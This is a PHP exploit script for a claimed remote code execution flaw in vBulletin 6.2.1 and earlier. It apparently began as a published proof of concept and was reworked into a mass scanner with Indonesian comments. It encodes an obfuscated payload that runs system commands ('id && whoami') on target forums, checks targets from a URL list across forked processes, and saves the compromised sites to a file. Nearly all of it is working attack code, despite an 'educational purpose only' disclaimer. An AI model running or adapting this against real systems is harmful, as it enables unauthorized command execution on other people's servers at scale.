<?php

/*
    -----------------------------------------------------------------
    vBulletin <= 6.2.1 (runMaths) Remote Code Execution Vulnerability
    -----------------------------------------------------------------
    
    author..............: Egidio Romano aka EgiX
    mail................: n0b0d13s[at]gmail[dot]com
    software link.......: https://www.vbulletin.com
    
    +-------------------------------------------------------------------------+
    | This proof of concept code was written for educational purpose only.    |
    | Use it at your own risk. Author will be not responsible for any damage. |
    +-------------------------------------------------------------------------+
    
    [-] Original Advisory:
    https://karmainsecurity.com/KIS-2026-13
*/

set_time_limit(0);
error_reporting(E_ALL);
ini_set('display_errors', 1);

print "+---------------------------------------------------------------------+\n";
print "| vBulletin <= 6.2.1 (runMaths) Remote Code Execution Exploit by EgiX |\n";
print "+---------------------------------------------------------------------+\n";

if (!extension_loaded("curl")) die("\n[+] cURL extension required!\n");

// ===================== ARGUMENT PARSING =====================

$listFile = null;
$outputFile = null;
$threads = 5;
$singleUrl = null;

for ($i = 1; $i < $argc; $i++) {
    switch ($argv[$i]) {
        case '-l':
            $listFile = $argv[++$i];
            break;
        case '-o':
            $outputFile = $argv[++$i];
            break;
        case '-t':
            $threads = intval($argv[++$i]);
            if ($threads < 1) $threads = 1;
            break;
        default:
            if (filter_var($argv[$i], FILTER_VALIDATE_URL)) {
                $singleUrl = $argv[$i];
            }
            break;
    }
}

if ($singleUrl === null && $listFile === null) {
    print "\nUsage......: php $argv[0] [OPTIONS] <URL>\n";
    print "\nOptions:";
    print "\n  -l <file>   Load URLs from file (one per line)";
    print "\n  -o <file>   Output vulnerable URLs to file";
    print "\n  -t <num>    Number of threads (default: 5)";
    print "\n\nExamples:";
    print "\n  php $argv[0] https://forum.boinaslava.net/";
    print "\n  php $argv[0] -l list.txt -o vuln.txt -t 10\n\n";
    die();
}

// ===================== CORE FUNCTIONS =====================

function encodeChar($char) {
    $numbers = ['0' => '(0)', '1' => '(1)', '2' => '(2)', '3' => '(3)', '4' => '(4)', '5' => '(5)', '6' => '(6)', '7' => '(7)', '8' => '(8)', '9' => '(9)'];
    $char = strval(ord($char));
    $ret = '';
    for ($i = 0; $i < strlen($char); $i++) {
        $ret .= $numbers[$char[$i]] . '.';
    }
    return rtrim($ret, '.');
}

function makePayload($function, $param) {
    $chr_fun = '((((999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999).(9))^((2).(0).(4)))^((8).(6).(((9).(9))^((9).(9)))))';
    $ret = '';
    foreach (str_split($function) as $c) {
        $ret .= $chr_fun . '(' . encodeChar($c) . ').';
    }
    $ret = "(" . rtrim($ret, '.') . ')((';
    foreach (str_split($param) as $c) {
        $ret .= $chr_fun . '(' . encodeChar($c) . ').';
    }
    return rtrim($ret, '.') . '))';
}

function checkVulnerability($url) {
    $url = rtrim($url, '/') . '/';
    $curl = curl_init();
    
    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($curl, CURLOPT_TIMEOUT, 15);
    curl_setopt($curl, CURLOPT_HEADER, false);
    curl_setopt($curl, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
    
    // Test 1: Cek endpoint
    $params = ["routestring" => "ajax/render/pagenav"];
    curl_setopt($curl, CURLOPT_POSTFIELDS, http_build_query($params));
    $response = curl_exec($curl);
    $httpCode = curl_getinfo($curl, CURLINFO_HTTP_CODE);
    
    if ($httpCode == 404 || $httpCode == 403) {
        curl_close($curl);
        return false;
    }
    
    // Test 2: Cek math execution
    $mathParams = [
        "routestring" => "ajax/render/pagenav",
        "pagenav[pagenumber]" => "2+2"
    ];
    curl_setopt($curl, CURLOPT_POSTFIELDS, http_build_query($mathParams));
    $response = curl_exec($curl);
    
    if (strpos($response, '4') === false) {
        curl_close($curl);
        return false;
    }
    
    // Test 3: Coba execute command
    $cmd = "id && whoami && echo _____";
    $payload = makePayload("system", $cmd);
    
    $exploitParams = [
        "routestring" => "ajax/render/pagenav",
        "pagenav[pagenumber]" => $payload
    ];
    
    curl_setopt($curl, CURLOPT_POSTFIELDS, http_build_query($exploitParams));
    $response = curl_exec($curl);
    
    curl_close($curl);
    
    // Cek apakah ada output yang valid
    if (preg_match('/_____(.*)_____/s', $response, $matches)) {
        $output = trim($matches[1]);
        if (!empty($output) && strpos($output, 'uid=') !== false) {
            return [
                'url' => $url,
                'output' => $output
            ];
        }
    }
    
    return false;
}

function formatOutput($result) {
    $output = "========================================\n";
    $output .= "URL: " . $result['url'] . "\n";
    $output .= "Output:\n" . $result['output'] . "\n";
    $output .= "========================================\n\n";
    return $output;
}

// ===================== SINGLE URL MODE =====================

if ($singleUrl !== null) {
    echo "\n[+] Checking single URL: " . $singleUrl . "\n";
    $result = checkVulnerability($singleUrl);
    
    if ($result !== false) {
        echo "\n[+] ✅ VULNERABLE!\n";
        echo formatOutput($result);
        
        if ($outputFile !== null) {
            file_put_contents($outputFile, formatOutput($result), FILE_APPEND);
            echo "[+] Saved to: " . $outputFile . "\n";
        }
    } else {
        echo "\n[-] Not vulnerable or already patched.\n";
    }
    exit(0);
}

// ===================== MASS SCAN MODE =====================

if ($listFile === null || !file_exists($listFile)) {
    die("\n[!] File not found: " . $listFile . "\n\n");
}

$urls = file($listFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
$total = count($urls);
$vulnerable = [];
$checked = 0;
$found = 0;

echo "\n[+] Loaded " . $total . " URLs from: " . $listFile . "\n";
echo "[+] Threads: " . $threads . "\n";
echo "[+] Output file: " . ($outputFile ?? 'none') . "\n\n";

// Multi-threading simulation dengan forking atau sequential
if ($threads > 1 && function_exists('pcntl_fork')) {
    // Gunakan PCNTL untuk multi-processing
    echo "[+] Using PCNTL for multi-processing\n\n";
    
    $pids = [];
    $chunkSize = ceil($total / $threads);
    
    for ($i = 0; $i < $threads; $i++) {
        $pid = pcntl_fork();
        
        if ($pid == -1) {
            die("Could not fork\n");
        } elseif ($pid == 0) {
            // Child process
            $start = $i * $chunkSize;
            $end = min($start + $chunkSize, $total);
            
            for ($j = $start; $j < $end; $j++) {
                $url = trim($urls[$j]);
                if (empty($url)) continue;
                
                echo "[*] Checking: " . $url . "\n";
                $result = checkVulnerability($url);
                
                if ($result !== false) {
                    echo "[+] ✅ VULNERABLE: " . $url . "\n";
                    $output = formatOutput($result);
                    
                    // Tulis langsung ke file jika ada
                    if ($outputFile !== null) {
                        file_put_contents($outputFile, $output, FILE_APPEND);
                    }
                    
                    // Simpan di shared memory atau tmp file
                    file_put_contents('/tmp/vuln_' . getmypid() . '.txt', $output, FILE_APPEND);
                } else {
                    echo "[-] Not vulnerable: " . $url . "\n";
                }
            }
            exit(0);
        }
    }
    
    // Parent process - wait for children
    for ($i = 0; $i < $threads; $i++) {
        pcntl_wait($status);
    }
    
    // Gabungkan hasil dari semua child
    if ($outputFile !== null) {
        $files = glob('/tmp/vuln_*.txt');
        foreach ($files as $file) {
            $content = file_get_contents($file);
            file_put_contents($outputFile, $content, FILE_APPEND);
            unlink($file);
        }
    }
    
} else {
    // Sequential mode
    echo "[+] Using sequential mode (no PCNTL available)\n\n";
    
    foreach ($urls as $url) {
        $url = trim($url);
        if (empty($url)) continue;
        
        $checked++;
        echo "[$checked/$total] Checking: " . $url . "\n";
        
        $result = checkVulnerability($url);
        
        if ($result !== false) {
            $found++;
            echo "[+] ✅ VULNERABLE #" . $found . ": " . $url . "\n";
            $output = formatOutput($result);
            
            // Tulis langsung ke output
            if ($outputFile !== null) {
                file_put_contents($outputFile, $output, FILE_APPEND);
                echo "[+] Saved to: " . $outputFile . "\n";
            }
            
            // Tampilkan output
            echo $output;
        } else {
            echo "[-] Not vulnerable\n";
        }
    }
}

// ===================== SUMMARY =====================

echo "\n========================================\n";
echo "[+] Scan completed!\n";
echo "[+] Total URLs checked: " . $checked . "\n";
echo "[+] Vulnerable found: " . $found . "\n";

if ($outputFile !== null) {
    echo "[+] Results saved to: " . $outputFile . "\n";
}
echo "========================================\n\n";

?>
